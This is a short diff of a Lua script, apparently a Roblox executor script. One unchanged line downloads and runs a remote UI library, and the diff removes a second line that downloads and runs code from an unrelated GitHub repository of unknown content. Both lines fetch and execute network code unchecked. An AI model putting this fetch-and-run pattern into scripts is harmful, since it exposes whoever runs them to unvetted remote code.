@@ -3,8 +3,6 @@
 local engine = loadstring(game:HttpGet("https://raw.githubusercontent.com/Singularity5490/rbimgui-2/main/rbimgui-2.lua"))()
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/epicdude99/test/main/test", true))()
-
 
 local settings = {
     enabled = nil,
